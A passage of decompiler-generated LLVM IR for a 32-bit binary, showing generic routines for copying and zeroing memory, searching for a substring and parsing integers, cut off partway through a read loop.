  %v0_8051c85 = phi i32 [ %v0_8051c8a, %dec_label_pc_8051c83.dec_label_pc_8051c83_crit_edge ], [ %v1_8051c71, %dec_label_pc_8051c7d ], [ 0, %dec_label_pc_8051c94 ]
  %v4_8051c83 = phi i32 [ %v4_8051c83.pre, %dec_label_pc_8051c83.dec_label_pc_8051c83_crit_edge ], [ %arg2, %dec_label_pc_8051c7d ], [ %arg2, %dec_label_pc_8051c94 ]
  %v0_8051c83 = phi i32 [ %v1_8051c88, %dec_label_pc_8051c83.dec_label_pc_8051c83_crit_edge ], [ %arg2, %dec_label_pc_8051c7d ], [ %arg2, %dec_label_pc_8051c94 ]
  %v1_8051c83 = inttoptr i32 %v0_8051c83 to i8*
  %v2_8051c83 = load i8, i8* %v1_8051c83, align 1
  %v3_8051c83 = zext i8 %v2_8051c83 to i32
  %v5_8051c83 = and i32 %v4_8051c83, -256
  %v6_8051c83 = or i32 %v3_8051c83, %v5_8051c83
  store i32 %v6_8051c83, i32* %eax.global-to-local, align 4
  %v1_8051c85 = add i32 %v0_8051c85, -1
  store i32 %v1_8051c85, i32* %edx.global-to-local, align 4
  %v3_8051c86 = inttoptr i32 %v2_8051c86 to i8*
  store i8 %v2_8051c83, i8* %v3_8051c86, align 1
  %v0_8051c88 = load i32, i32* @ecx, align 4
  %v1_8051c88 = add i32 %v0_8051c88, 1
  store i32 %v1_8051c88, i32* @ecx, align 4
  %v0_8051c89 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051c89 = add i32 %v0_8051c89, 1
  store i32 %v1_8051c89, i32* %ebx.global-to-local, align 4
  %v0_8051c8a = load i32, i32* %edx.global-to-local, align 4
  %v10_8051c8a = icmp eq i32 %v0_8051c8a, -1
  %v1_8051c8d = icmp eq i1 %v10_8051c8a, false
  br i1 %v1_8051c8d, label %dec_label_pc_8051c83.dec_label_pc_8051c83_crit_edge, label %dec_label_pc_8051c8f.loopexit

dec_label_pc_8051c83.dec_label_pc_8051c83_crit_edge: ; preds = %dec_label_pc_8051c83
  %v4_8051c83.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051c83

dec_label_pc_8051c8f.loopexit:                    ; preds = %dec_label_pc_8051c83
  %v0_8051c8f.pre = load i32, i32* %esi.global-to-local, align 4
  %v2_8051c91.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051c8f

dec_label_pc_8051c8f:                             ; preds = %dec_label_pc_8051c8f.loopexit, %dec_label_pc_8051c78
  %v2_8051c91 = phi i32 [ %v2_8051c91.pre, %dec_label_pc_8051c8f.loopexit ], [ %v0_8051c61, %dec_label_pc_8051c78 ]
  %v0_8051c8f = phi i32 [ %v0_8051c8f.pre, %dec_label_pc_8051c8f.loopexit ], [ %v1_8051c71, %dec_label_pc_8051c78 ]
  store i32 %v0_8051c8f, i32* %eax.global-to-local, align 4
  store i32 %v2_8051c91, i32* @ebx, align 4
  ret i32 %v0_8051c8f

dec_label_pc_8051c94:                             ; preds = %dec_label_pc_8051c60
  store i32 %v4_8051c66, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051c83

; uselistorder directives
  uselistorder i32 %v0_8051c8f, { 1, 0 }
  uselistorder i32 %v1_8051c89, { 1, 0 }
  uselistorder i32 %v1_8051c88, { 1, 0 }
  uselistorder i32 %v1_8051c71, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 %v4_8051c66, { 2, 0, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 5, 0, 1, 2, 3, 6, 4, 7, 8 }
  uselistorder label %dec_label_pc_8051c83, { 0, 2, 1 }
}

define i32 @function_8051ca0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051ca0:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051ca1 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ca1, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v1_8051cae = icmp eq i32 %arg3, 0
  br i1 %v1_8051cae, label %dec_label_pc_8051cbf, label %dec_label_pc_8051cb2

dec_label_pc_8051cb2:                             ; preds = %dec_label_pc_8051ca0
  store i32 0, i32* %edx.global-to-local, align 4
  %v3_8051cb411 = inttoptr i32 %arg2 to i8*
  %v4_8051cb412 = load i8, i8* %v3_8051cb411, align 1
  %v6_8051cb714 = inttoptr i32 %arg1 to i8*
  store i8 %v4_8051cb412, i8* %v6_8051cb714, align 1
  %v0_8051cba15 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051cba16 = add i32 %v0_8051cba15, 1
  store i32 %v1_8051cba16, i32* %edx.global-to-local, align 4
  %v12_8051cbb17 = icmp eq i32 %v1_8051cba16, %arg3
  %v1_8051cbd18 = icmp eq i1 %v12_8051cbb17, false
  br i1 %v1_8051cbd18, label %dec_label_pc_8051cb4.dec_label_pc_8051cb4_crit_edge, label %dec_label_pc_8051cbf.loopexit

dec_label_pc_8051cb4.dec_label_pc_8051cb4_crit_edge: ; preds = %dec_label_pc_8051cb2, %dec_label_pc_8051cb4.dec_label_pc_8051cb4_crit_edge
  %v1_8051cba20 = phi i32 [ %v1_8051cba, %dec_label_pc_8051cb4.dec_label_pc_8051cb4_crit_edge ], [ %v1_8051cba16, %dec_label_pc_8051cb2 ]
  %v1_8051cb4.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8051cb7.pre = load i32, i32* %esi.global-to-local, align 4
  %v2_8051cb4 = add i32 %v1_8051cba20, %v1_8051cb4.pre
  %v3_8051cb4 = inttoptr i32 %v2_8051cb4 to i8*
  %v4_8051cb4 = load i8, i8* %v3_8051cb4, align 1
  %v5_8051cb7 = add i32 %v1_8051cba20, %v4_8051cb7.pre
  %v6_8051cb7 = inttoptr i32 %v5_8051cb7 to i8*
  store i8 %v4_8051cb4, i8* %v6_8051cb7, align 1
  %v0_8051cba = load i32, i32* %edx.global-to-local, align 4
  %v1_8051cba = add i32 %v0_8051cba, 1
  store i32 %v1_8051cba, i32* %edx.global-to-local, align 4
  %v12_8051cbb = icmp eq i32 %v1_8051cba, %arg3
  %v1_8051cbd = icmp eq i1 %v12_8051cbb, false
  br i1 %v1_8051cbd, label %dec_label_pc_8051cb4.dec_label_pc_8051cb4_crit_edge, label %dec_label_pc_8051cbf.loopexit

dec_label_pc_8051cbf.loopexit:                    ; preds = %dec_label_pc_8051cb4.dec_label_pc_8051cb4_crit_edge, %dec_label_pc_8051cb2
  %v4_8051cb4.lcssa = phi i8 [ %v4_8051cb412, %dec_label_pc_8051cb2 ], [ %v4_8051cb4, %dec_label_pc_8051cb4.dec_label_pc_8051cb4_crit_edge ]
  %phitmp = sext i8 %v4_8051cb4.lcssa to i32
  %v2_8051cbf.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051cbf

dec_label_pc_8051cbf:                             ; preds = %dec_label_pc_8051cbf.loopexit, %dec_label_pc_8051ca0
  %v2_8051cbf = phi i32 [ %v0_8051ca1, %dec_label_pc_8051ca0 ], [ %v2_8051cbf.pre, %dec_label_pc_8051cbf.loopexit ]
  %.1 = phi i32 [ 0, %dec_label_pc_8051ca0 ], [ %phitmp, %dec_label_pc_8051cbf.loopexit ]
  store i32 %v2_8051cbf, i32* @ebx, align 4
  ret i32 %.1

; uselistorder directives
  uselistorder i32 %v1_8051cba, { 1, 2, 0 }
  uselistorder i32 %v1_8051cba20, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051cb4.dec_label_pc_8051cb4_crit_edge, { 1, 0 }
}

define i32 @function_8051cd0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051cd0:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8051cd8 = icmp eq i32 %arg2, 0
  br i1 %v1_8051cd8, label %dec_label_pc_8051cd0.dec_label_pc_8051ce9_crit_edge, label %dec_label_pc_8051cdc

dec_label_pc_8051cd0.dec_label_pc_8051ce9_crit_edge: ; preds = %dec_label_pc_8051cd0
  %v0_8051ce9.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051ce9

dec_label_pc_8051cdc:                             ; preds = %dec_label_pc_8051cd0
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8051ce05 = inttoptr i32 %arg1 to i8*
  store i8 0, i8* %v3_8051ce05, align 1
  %v0_8051ce46 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051ce47 = add i32 %v0_8051ce46, 1
  store i32 %v1_8051ce47, i32* %eax.global-to-local, align 4
  %v12_8051ce58 = icmp eq i32 %v1_8051ce47, %arg2
  %v1_8051ce79 = icmp eq i1 %v12_8051ce58, false
  br i1 %v1_8051ce79, label %dec_label_pc_8051ce0.dec_label_pc_8051ce0_crit_edge, label %dec_label_pc_8051ce9

dec_label_pc_8051ce0.dec_label_pc_8051ce0_crit_edge: ; preds = %dec_label_pc_8051cdc, %dec_label_pc_8051ce0.dec_label_pc_8051ce0_crit_edge
  %v1_8051ce410 = phi i32 [ %v1_8051ce4, %dec_label_pc_8051ce0.dec_label_pc_8051ce0_crit_edge ], [ %v1_8051ce47, %dec_label_pc_8051cdc ]
  %v1_8051ce0.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051ce0 = add i32 %v1_8051ce410, %v1_8051ce0.pre
  %v3_8051ce0 = inttoptr i32 %v2_8051ce0 to i8*
  store i8 0, i8* %v3_8051ce0, align 1
  %v0_8051ce4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051ce4 = add i32 %v0_8051ce4, 1
  store i32 %v1_8051ce4, i32* %eax.global-to-local, align 4
  %v12_8051ce5 = icmp eq i32 %v1_8051ce4, %arg2
  %v1_8051ce7 = icmp eq i1 %v12_8051ce5, false
  br i1 %v1_8051ce7, label %dec_label_pc_8051ce0.dec_label_pc_8051ce0_crit_edge, label %dec_label_pc_8051ce9

dec_label_pc_8051ce9:                             ; preds = %dec_label_pc_8051cdc, %dec_label_pc_8051ce0.dec_label_pc_8051ce0_crit_edge, %dec_label_pc_8051cd0.dec_label_pc_8051ce9_crit_edge
  %v0_8051ce9 = phi i32 [ %v0_8051ce9.pre, %dec_label_pc_8051cd0.dec_label_pc_8051ce9_crit_edge ], [ %v1_8051ce47, %dec_label_pc_8051cdc ], [ %v1_8051ce4, %dec_label_pc_8051ce0.dec_label_pc_8051ce0_crit_edge ]
  ret i32 %v0_8051ce9

; uselistorder directives
  uselistorder i32 %v1_8051ce4, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051ce9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051ce0.dec_label_pc_8051ce0_crit_edge, { 1, 0 }
}

define i32 @function_8051cf0() local_unnamed_addr {
dec_label_pc_8051cf0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp10, i32* @ecx, align 4
  %v7_8051d05 = icmp sgt i32 %tmp9, %tmp10
  br i1 %v7_8051d05, label %dec_label_pc_8051d07, label %dec_label_pc_8051d10

dec_label_pc_8051d07:                             ; preds = %dec_label_pc_8051d22, %dec_label_pc_8051cf0, %dec_label_pc_8051d10
  br label %dec_label_pc_8051d0a

dec_label_pc_8051d0a:                             ; preds = %dec_label_pc_8051d35, %dec_label_pc_8051d07
  %storemerge = phi i32 [ -1, %dec_label_pc_8051d07 ], [ %v0_8051d23, %dec_label_pc_8051d35 ]
  ret i32 %storemerge

dec_label_pc_8051d10:                             ; preds = %dec_label_pc_8051cf0
  %tmp17 = icmp slt i32 %tmp10, 1
  br i1 %tmp17, label %dec_label_pc_8051d07, label %dec_label_pc_8051d14

dec_label_pc_8051d14:                             ; preds = %dec_label_pc_8051d10
  %v2_8051d2c = add i32 %tmp, -1
  br label %dec_label_pc_8051d28

dec_label_pc_8051d20:                             ; preds = %dec_label_pc_8051d28
  br label %dec_label_pc_8051d22

dec_label_pc_8051d22:                             ; preds = %dec_label_pc_8051d35, %dec_label_pc_8051d20
  %v2_8051d303 = phi i32 [ %v1_8051d35, %dec_label_pc_8051d35 ], [ 0, %dec_label_pc_8051d20 ]
  %v1_8051d22 = add i32 %v0_8051d22, 1
  %v1_8051d23 = add i32 %v0_8051d23, 1
  %v12_8051d24 = icmp eq i32 %tmp10, %v1_8051d22
  br i1 %v12_8051d24, label %dec_label_pc_8051d07, label %dec_label_pc_8051d28

dec_label_pc_8051d28:                             ; preds = %dec_label_pc_8051d22, %dec_label_pc_8051d14
  %v0_8051d22 = phi i32 [ %v1_8051d22, %dec_label_pc_8051d22 ], [ 0, %dec_label_pc_8051d14 ]
  %v0_8051d35 = phi i32 [ %v2_8051d303, %dec_label_pc_8051d22 ], [ 0, %dec_label_pc_8051d14 ]
  %v0_8051d23 = phi i32 [ %v1_8051d23, %dec_label_pc_8051d22 ], [ 1, %dec_label_pc_8051d14 ]
  %v3_8051d2c = add i32 %v2_8051d2c, %v0_8051d23
  %v4_8051d2c = inttoptr i32 %v3_8051d2c to i8*
  %v5_8051d2c = load i8, i8* %v4_8051d2c, align 1
  %v4_8051d30 = add i32 %v0_8051d35, %tmp8
  %v5_8051d30 = inttoptr i32 %v4_8051d30 to i8*
  %v6_8051d30 = load i8, i8* %v5_8051d30, align 1
  %v17_8051d30 = icmp eq i8 %v5_8051d2c, %v6_8051d30
  %v1_8051d33 = icmp eq i1 %v17_8051d30, false
  br i1 %v1_8051d33, label %dec_label_pc_8051d20, label %dec_label_pc_8051d35

dec_label_pc_8051d35:                             ; preds = %dec_label_pc_8051d28
  %v1_8051d35 = add i32 %v0_8051d35, 1
  %v12_8051d36 = icmp eq i32 %tmp9, %v1_8051d35
  %v1_8051d38 = icmp eq i1 %v12_8051d36, false
  br i1 %v1_8051d38, label %dec_label_pc_8051d22, label %dec_label_pc_8051d0a

; uselistorder directives
  uselistorder i32 %v0_8051d23, { 2, 0, 1 }
  uselistorder i32 %v0_8051d35, { 1, 0 }
  uselistorder i32 %v1_8051d22, { 1, 0 }
  uselistorder label %dec_label_pc_8051d07, { 0, 2, 1 }
}

define i32 @function_8051d40(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051d40:
  %v4_8051d47 = ptrtoint i8* %arg1 to i32
  %v4_8051d50.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051d50

dec_label_pc_8051d50:                             ; preds = %dec_label_pc_8051d64, %dec_label_pc_8051d60, %dec_label_pc_8051d50, %dec_label_pc_8051d40
  %v4_8051d50 = phi i32 [ %v4_8051d50.pre, %dec_label_pc_8051d40 ], [ %v6_8051d50, %dec_label_pc_8051d50 ], [ %v6_8051d50, %dec_label_pc_8051d60 ], [ %v6_8051d50, %dec_label_pc_8051d64 ]
  %v0_8051d52 = phi i32 [ %v4_8051d47, %dec_label_pc_8051d40 ], [ %v1_8051d52, %dec_label_pc_8051d50 ], [ %v1_8051d52, %dec_label_pc_8051d60 ], [ %v1_8051d52, %dec_label_pc_8051d64 ]
  %v1_8051d50 = inttoptr i32 %v0_8051d52 to i8*
  %v2_8051d50 = load i8, i8* %v1_8051d50, align 1
  %v3_8051d50 = zext i8 %v2_8051d50 to i32
  %v5_8051d50 = and i32 %v4_8051d50, -256
  %v6_8051d50 = or i32 %v3_8051d50, %v5_8051d50
  %v1_8051d52 = add i32 %v0_8051d52, 1
  %v7_8051d5c = icmp eq i8 %v2_8051d50, 32
  br i1 %v7_8051d5c, label %dec_label_pc_8051d50, label %dec_label_pc_8051d60

dec_label_pc_8051d60:                             ; preds = %dec_label_pc_8051d50
  %v10_8051d60 = icmp eq i8 %v2_8051d50, 9
  br i1 %v10_8051d60, label %dec_label_pc_8051d50, label %dec_label_pc_8051d64

dec_label_pc_8051d64:                             ; preds = %dec_label_pc_8051d60
  %v10_8051d64 = icmp eq i8 %v2_8051d50, 10
  br i1 %v10_8051d64, label %dec_label_pc_8051d50, label %dec_label_pc_8051d68

dec_label_pc_8051d68:                             ; preds = %dec_label_pc_8051d64
  %tmp41 = sext i32 %arg2 to i64
  %v10_8051d68 = icmp eq i8 %v2_8051d50, 45
  br i1 %v10_8051d68, label %dec_label_pc_8051e1d, label %dec_label_pc_8051d71

dec_label_pc_8051d71:                             ; preds = %dec_label_pc_8051d68
  %v10_8051d71 = icmp eq i8 %v2_8051d50, 43
  br i1 %v10_8051d71, label %dec_label_pc_8051e4d, label %dec_label_pc_8051d7a

dec_label_pc_8051d7a:                             ; preds = %dec_label_pc_8051d71, %dec_label_pc_8051e4d
  %v0_8051dc430 = phi i32 [ %v1_8051d52, %dec_label_pc_8051d71 ], [ %v1_8051e50, %dec_label_pc_8051e4d ]
  %v0_8051df016.in = phi i8 [ %v2_8051d50, %dec_label_pc_8051d71 ], [ %v2_8051e4d, %dec_label_pc_8051e4d ]
  %v2_8051dce9 = phi i8 [ %v2_8051d50, %dec_label_pc_8051d71 ], [ %v2_8051e4d, %dec_label_pc_8051e4d ]
  br label %dec_label_pc_8051d87

dec_label_pc_8051d87:                             ; preds = %dec_label_pc_8051e1d, %dec_label_pc_8051d7a
  %v0_8051dc429 = phi i32 [ %v1_8051e25, %dec_label_pc_8051e1d ], [ %v0_8051dc430, %dec_label_pc_8051d7a ]
  %v0_8051df015.in = phi i8 [ %v2_8051e1d, %dec_label_pc_8051e1d ], [ %v0_8051df016.in, %dec_label_pc_8051d7a ]
  %v2_8051dce8 = phi i8 [ %v2_8051e1d, %dec_label_pc_8051e1d ], [ %v2_8051dce9, %dec_label_pc_8051d7a ]
  %v0_8051d87 = phi i64 [ 2147483648, %dec_label_pc_8051e1d ], [ 2147483647, %dec_label_pc_8051d7a ]
  %stack_var_-20.0 = phi i32 [ 1, %dec_label_pc_8051e1d ], [ 0, %dec_label_pc_8051d7a ]
  %v12_8051d8b = udiv i64 %v0_8051d87, %tmp41
  %v13_8051d8b = trunc i64 %v12_8051d8b to i32
  %v14_8051d8b = urem i64 %v0_8051d87, %tmp41
  %v15_8051d8b = trunc i64 %v14_8051d8b to i32
  br label %dec_label_pc_8051dce

dec_label_pc_8051da0:                             ; preds = %dec_label_pc_8051dce
  %v1_8051da0 = add nsw i32 %v0_8051da0, -48
  %v7_8051da7 = icmp slt i32 %v1_8051da0, %arg2
  br i1 %v7_8051da7, label %dec_label_pc_8051da9, label %dec_label_pc_8051dfa

dec_label_pc_8051da9:                             ; preds = %dec_label_pc_8051da0, %dec_label_pc_8051df0
  %v1_8051dc1 = phi i32 [ %v1_8051da0, %dec_label_pc_8051da0 ], [ %v2_8051df2, %dec_label_pc_8051df0 ]
  %v2_8051da9 = icmp slt i32 %v0_8051da9, 0
  br i1 %v2_8051da9, label %dec_label_pc_8051e18, label %dec_label_pc_8051dad

dec_label_pc_8051dad:                             ; preds = %dec_label_pc_8051da9
  %tmp42 = icmp ugt i32 %v0_8051dad, %v13_8051d8b
  br i1 %tmp42, label %dec_label_pc_8051e18, label %dec_label_pc_8051db3

dec_label_pc_8051db3:                             ; preds = %dec_label_pc_8051dad
  %v15_8051dad = icmp eq i32 %v0_8051dad, %v13_8051d8b
  br i1 %v15_8051dad, label %dec_label_pc_8051e12, label %dec_label_pc_8051db5

dec_label_pc_8051db5:                             ; preds = %dec_label_pc_8051e12, %dec_label_pc_8051db3
  %v4_8051dbe = mul i32 %v1_8051dbe, %arg2
  %v2_8051dc1 = add i32 %v1_8051dc1, %v4_8051dbe
  br label %dec_label_pc_8051dc4

dec_label_pc_8051dc4:                             ; preds = %dec_label_pc_8051e18, %dec_label_pc_8051db5
  %v1_8051dbe26 = phi i32 [ %v1_8051dbe, %dec_label_pc_8051e18 ], [ %v2_8051dc1, %dec_label_pc_8051db5 ]
  %v0_8051e0220 = phi i32 [ %v0_8051dad, %dec_label_pc_8051e18 ], [ %v2_8051dc1, %dec_label_pc_8051db5 ]
  %v0_8051dfa19 = phi i32 [ -1, %dec_label_pc_8051e18 ], [ 1, %dec_label_pc_8051db5 ]
  %v1_8051dc4 = inttoptr i32 %v0_8051dc4 to i8*
  %v2_8051dc4 = load i8, i8* %v1_8051dc4, align 1
  %v1_8051dca = add i32 %v0_8051dc4, 1
  br label %dec_label_pc_8051dce

dec_label_pc_8051dce:                             ; preds = %dec_label_pc_8051d87, %dec_label_pc_8051dc4
  %v0_8051dc4 = phi i32 [ %v0_8051dc429, %dec_label_pc_8051d87 ], [ %v1_8051dca, %dec_label_pc_8051dc4 ]
  %v1_8051dbe = phi i32 [ 0, %dec_label_pc_8051d87 ], [ %v1_8051dbe26, %dec_label_pc_8051dc4 ]
  %v0_8051dad = phi i32 [ 0, %dec_label_pc_8051d87 ], [ %v0_8051e0220, %dec_label_pc_8051dc4 ]
  %v0_8051da9 = phi i32 [ 0, %dec_label_pc_8051d87 ], [ %v0_8051dfa19, %dec_label_pc_8051dc4 ]
  %v0_8051da0.in = phi i8 [ %v0_8051df015.in, %dec_label_pc_8051d87 ], [ %v2_8051dc4, %dec_label_pc_8051dc4 ]
  %v2_8051dce = phi i8 [ %v2_8051dce8, %dec_label_pc_8051d87 ], [ %v2_8051dc4, %dec_label_pc_8051dc4 ]
  %v0_8051da0 = sext i8 %v0_8051da0.in to i32
  %v1_8051dd1 = add i8 %v2_8051dce, -48
  %tmp43 = icmp ult i8 %v1_8051dd1, 10
  br i1 %tmp43, label %dec_label_pc_8051da0, label %dec_label_pc_8051dd8

dec_label_pc_8051dd8:                             ; preds = %dec_label_pc_8051dce
  %v1_8051dd8 = add i8 %v2_8051dce, -65
  store i32 55, i32* @ecx, align 4
  %tmp44 = icmp ult i8 %v1_8051dd8, 26
  br i1 %tmp44, label %dec_label_pc_8051df0, label %dec_label_pc_8051de4

dec_label_pc_8051de4:                             ; preds = %dec_label_pc_8051dd8
  %v1_8051de4 = add i8 %v2_8051dce, -97
  %tmp45 = icmp ult i8 %v1_8051de4, 26
  br i1 %tmp45, label %dec_label_pc_8051deb, label %dec_label_pc_8051dfa

dec_label_pc_8051deb:                             ; preds = %dec_label_pc_8051de4
  store i32 87, i32* @ecx, align 4
  br label %dec_label_pc_8051df0

dec_label_pc_8051df0:                             ; preds = %dec_label_pc_8051dd8, %dec_label_pc_8051deb
  %v1_8051df2 = phi i32 [ 55, %dec_label_pc_8051dd8 ], [ 87, %dec_label_pc_8051deb ]
  %v2_8051df2 = sub nsw i32 %v0_8051da0, %v1_8051df2
  %v7_8051df8 = icmp slt i32 %v2_8051df2, %arg2
  br i1 %v7_8051df8, label %dec_label_pc_8051da9, label %dec_label_pc_8051dfa

dec_label_pc_8051dfa:                             ; preds = %dec_label_pc_8051da0, %dec_label_pc_8051de4, %dec_label_pc_8051df0
  %v2_8051dfa = icmp slt i32 %v0_8051da9, 0
  br i1 %v2_8051dfa, label %dec_label_pc_8051e39, label %dec_label_pc_8051dfe

dec_label_pc_8051dfe:                             ; preds = %dec_label_pc_8051dfa
  store i32 %stack_var_-20.0, i32* @ecx, align 4
  %v1_8051e04 = icmp eq i32 %stack_var_-20.0, 0
  br i1 %v1_8051e04, label %dec_label_pc_8051e0a, label %dec_label_pc_8051e08

dec_label_pc_8051e08:                             ; preds = %dec_label_pc_8051dfe
  %v1_8051e08 = sub i32 0, %v0_8051dad
  br label %dec_label_pc_8051e0a

dec_label_pc_8051e0a:                             ; preds = %dec_label_pc_8051dfe, %dec_label_pc_8051e08
  %v0_8051e11 = phi i32 [ %v0_8051dad, %dec_label_pc_8051dfe ], [ %v1_8051e08, %dec_label_pc_8051e08 ]
  ret i32 %v0_8051e11

dec_label_pc_8051e12:                             ; preds = %dec_label_pc_8051db3
  %v5_8051e12 = sub i32 %v1_8051dc1, %v15_8051d8b
  %v11_8051e12 = xor i32 %v1_8051dc1, %v15_8051d8b
  %v12_8051e12 = xor i32 %v5_8051e12, %v1_8051dc1
  %v13_8051e12 = and i32 %v12_8051e12, %v11_8051e12
  %v14_8051e12 = icmp slt i32 %v13_8051e12, 0
  %v15_8051e12 = icmp eq i32 %v5_8051e12, 0
  %v16_8051e12 = icmp slt i32 %v5_8051e12, 0
  %v3_8051e16 = icmp ne i1 %v16_8051e12, %v14_8051e12
  %v4_8051e16 = or i1 %v15_8051e12, %v3_8051e16
  br i1 %v4_8051e16, label %dec_label_pc_8051db5, label %dec_label_pc_8051e18

dec_label_pc_8051e18:                             ; preds = %dec_label_pc_8051dad, %dec_label_pc_8051e12, %dec_label_pc_8051da9
  br label %dec_label_pc_8051dc4

dec_label_pc_8051e1d:                             ; preds = %dec_label_pc_8051d68
  %v1_8051e1d = inttoptr i32 %v1_8051d52 to i8*
  %v2_8051e1d = load i8, i8* %v1_8051e1d, align 1
  %v1_8051e25 = add i32 %v0_8051d52, 2
  br label %dec_label_pc_8051d87

dec_label_pc_8051e39:                             ; preds = %dec_label_pc_8051dfa
  %v8_8051e39 = icmp eq i32 %stack_var_-20.0, 0
  %v2_8051e3e = zext i1 %v8_8051e39 to i32
  %v1_8051e433 = or i32 %v2_8051e3e, -2147483648
  ret i32 %v1_8051e433

dec_label_pc_8051e4d:                             ; preds = %dec_label_pc_8051d71
  %v1_8051e4d = inttoptr i32 %v1_8051d52 to i8*
  %v2_8051e4d = load i8, i8* %v1_8051e4d, align 1
  %v1_8051e50 = add i32 %v0_8051d52, 2
  br label %dec_label_pc_8051d7a

; uselistorder directives
  uselistorder i32 %v5_8051e12, { 1, 2, 0 }
  uselistorder i32 %v2_8051df2, { 1, 0 }
  uselistorder i8 %v2_8051dc4, { 1, 0 }
  uselistorder i32 %v2_8051dc1, { 1, 0 }
  uselistorder i32 %v1_8051dc1, { 0, 1, 3, 2 }
  uselistorder i32 %v13_8051d8b, { 1, 0 }
  uselistorder i32 %v1_8051d52, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_8051d50, { 2, 1, 0 }
  uselistorder i8 %v2_8051d50, { 3, 0, 1, 2, 4, 5, 6, 7 }
  uselistorder i32 %v0_8051d52, { 1, 0, 2, 3 }
  uselistorder i8 9, { 0, 4, 6, 5, 1, 7, 2, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8051e18, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051e0a, { 1, 0 }
  uselistorder label %dec_label_pc_8051dfa, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051df0, { 1, 0 }
  uselistorder label %dec_label_pc_8051dce, { 1, 0 }
  uselistorder label %dec_label_pc_8051da9, { 1, 0 }
  uselistorder label %dec_label_pc_8051d7a, { 1, 0 }
}

define i32 @function_8051e60(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051e60:
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8051e61 = load i32, i32* @edi, align 4
  %v0_8051e63 = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg3, i32* @edi, align 4
  %v0_8051e75.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051e75

dec_label_pc_8051e75:                             ; preds = %dec_label_pc_8051e8d.dec_label_pc_8051e75_crit_edge, %dec_label_pc_8051e60
  %v0_8051e7c = phi i32 [ %v0_8051e7c.pre, %dec_label_pc_8051e8d.dec_label_pc_8051e75_crit_edge ], [ %arg3, %dec_label_pc_8051e60 ]
  %v1_8051e76 = phi i32 [ %v1_8051e88, %dec_label_pc_8051e8d.dec_label_pc_8051e75_crit_edge ], [ 0, %dec_label_pc_8051e60 ]
  %v0_8051e76 = phi i32 [ %v1_8051e8d, %dec_label_pc_8051e8d.dec_label_pc_8051e75_crit_edge ], [ %arg1, %dec_label_pc_8051e60 ]
  %v0_8051e75 = phi i32 [ %v1_8051e85, %dec_label_pc_8051e8d.dec_label_pc_8051e75_crit_edge ], [ %v0_8051e75.pre, %dec_label_pc_8051e60 ]
  %v2_8051e76 = add i32 %v0_8051e76, %v1_8051e76
  %v4_8051e7d = inttoptr i32 %v2_8051e76 to i32*
  %v5_8051e7d = call i32 @function_805237c(i32 %v0_8051e7c, i32* %v4_8051e7d, i32 1, i32 %v0_8051e75)
  %v1_8051e85 = add i32 %v5_8051e7d, -1
  %v8_8051e85 = icmp eq i32 %v1_8051e85, 0
  %v1_8051e86 = icmp eq i1 %v8_8051e85, false
  %v0_8051e94.pre = load i32, i32* @ebx, align 4
  br i1 %v1_8051e86, label %dec_label_pc_8051e94, label %dec_label_pc_8051e88

dec_label_pc_8051e88:                             ; preds = %dec_label_pc_8051e75
  %v1_8051e88 = add i32 %v0_8051e94.pre, 1
  store i32 %v1_8051e88, i32* @ebx, align 4
  %v0_8051e89 = load i32, i32* %ebp.global-to-local, align 4
  %v7_8051e8b = icmp sgt i32 %v0_8051e89, %v1_8051e88
  br i1 %v7_8051e8b, label %dec_label_pc_8051e8d, label %dec_label_pc_8051e94

dec_label_pc_8051e8d:                             ; preds = %dec_label_pc_8051e88
